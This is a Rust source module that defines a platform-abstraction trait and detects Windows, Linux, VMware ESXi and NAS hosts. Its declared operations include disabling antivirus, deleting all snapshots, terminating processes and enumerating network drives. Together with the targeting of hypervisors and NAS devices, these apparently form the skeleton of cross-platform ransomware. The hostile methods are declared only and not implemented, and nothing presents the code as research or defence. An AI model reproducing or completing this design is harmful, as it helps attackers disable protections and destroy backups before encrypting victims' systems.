use std::path::Path;

#[cfg(windows)]
use super::windows::WindowsPlatform;

#[cfg(target_os = "linux")]
use super::linux::LinuxPlatform;

#[cfg(target_os = "linux")]
use super::esxi::ESXiPlatform;

#[cfg(target_os = "linux")]
use super::nas::NASPlatform;

pub trait Platform {
    fn platform_name(&self) -> &'static str;
    
    fn file_lock_check(&self, path: &Path) -> bool;
    
    fn get_process_list(&self) -> Vec<ProcessInfo>;
    
    fn terminate_process(&self, pid: u32) -> bool;
    
    fn get_network_drives(&self) -> Vec<String>;
    
    fn is_virtual_machine(&self) -> bool;
    
    fn get_system_info(&self) -> SystemInfo;
    
    fn disable_antivirus(&self) -> Result<(), String>;
    
    fn enable_antivirus(&self) -> Result<(), String>;
    
    fn create_snapshot(&self, path: &Path) -> Result<(), String>;
    
    fn restore_snapshot(&self, path: &Path) -> Result<(), String>;
    
    fn delete_all_snapshots(&self) -> Result<(), String>;
}

#[derive(Debug, Clone)]
pub struct ProcessInfo {
    pub pid: u32,
    pub name: String,
    pub path: String,
    pub handles: Vec<String>,
}

#[derive(Debug, Clone)]
pub struct SystemInfo {
    pub os_name: String,
    pub os_version: String,
    pub hostname: String,
    pub cpu_cores: usize,
    pub total_memory: u64,
    pub available_memory: u64,
    pub platform_type: PlatformType,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PlatformType {
    Windows,
    Linux,
    ESXi,
    NAS,
    Unknown,
}

pub fn get_platform() -> Box<dyn Platform> {
    #[cfg(windows)]
    {
        Box::new(WindowsPlatform::new())
    }
    
    #[cfg(target_os = "linux")]
    {
        if is_esxi() {
            Box::new(ESXiPlatform::new())
        } else if is_nas() {
            Box::new(NASPlatform::new())
        } else {
            Box::new(LinuxPlatform::new())
        }
    }
    
    #[cfg(not(any(windows, target_os = "linux")))]
    {
        panic!("Unsupported platform")
    }
}

#[cfg(target_os = "linux")]
fn is_esxi() -> bool {
    std::fs::read_to_string("/etc/vmware-release").is_ok()
        || std::fs::read_to_string("/proc/vmware").is_ok()
}

#[cfg(target_os = "linux")]
fn is_nas() -> bool {
    let nas_indicators = vec![
        "/etc/synoinfo.conf",
        "/etc/qnap.conf",
        "/etc/TrueNAS-VERSION",
        "/etc/omv.conf",
    ];
    
    nas_indicators.iter().any(|path| std::fs::metadata(path).is_ok())
}
